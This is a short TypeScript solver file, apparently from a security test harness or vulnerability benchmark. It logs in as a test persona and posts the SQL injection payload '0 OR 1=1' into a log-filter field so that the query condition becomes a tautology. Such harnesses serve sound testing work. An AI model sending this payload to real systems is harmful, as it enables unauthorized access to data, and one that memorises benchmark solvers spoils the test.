// Submit a log filter whose numeric threshold carries a trailing boolean clause, turning the bounded
// sequence comparison into a tautology that changes the query structure.
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')

  const fField = ctx.plan.params.filterExpr ?? 'filter'
  const body: Record<string, string> = {}
  body[fField] = '0 OR 1=1'

  await ctx.fetch(ctx.plan.routes.logFilter!.path, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(body),
  })
}
